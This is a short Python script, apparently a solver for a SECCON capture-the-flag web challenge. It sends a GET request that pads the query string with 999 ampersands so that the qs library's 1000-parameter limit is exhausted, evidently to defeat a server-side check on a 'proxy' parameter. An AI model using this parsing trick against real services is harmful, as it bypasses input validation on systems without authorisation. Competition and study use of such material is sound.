import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"

# ref. https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L21
PARAMETER_LIMIT = 1000

query = "proxy=something" + ("&"*(PARAMETER_LIMIT - 1))
res = httpx.get(f"{BASE_URL}/?{query}")
print(res.text)
